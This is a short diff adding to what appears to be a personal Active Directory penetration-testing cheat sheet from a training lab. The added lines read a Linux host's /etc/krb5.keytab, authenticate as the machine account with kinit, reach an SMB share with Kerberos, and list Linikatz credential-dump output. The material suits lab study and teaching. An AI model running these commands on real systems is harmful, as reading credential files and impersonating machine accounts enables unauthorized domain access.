@@ -14,6 +14,16 @@ pip install crackmapexec
 # Connect to User
 ssh david@inlanefreight.htb@10.129.204.23 -p 2222
 
+# Active Directory-də Linux maşınlarının etimadnaməsini ehtiva edən bir fayl
+klist -k /etc/krb5.keytab
+kinit -k -t /etc/krb5.keytab <USER>$
+klist
+smbclient //DC01/linux01 -k
+
+
+Linikatz result: _etc_krb5.keytab.29352
+Linikatz result: _etc_krb5.conf.24895
+
 # Domain info cekmek
 python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -dc-ip 10.10.10.10 DOMAIN.LOCAL
 OR
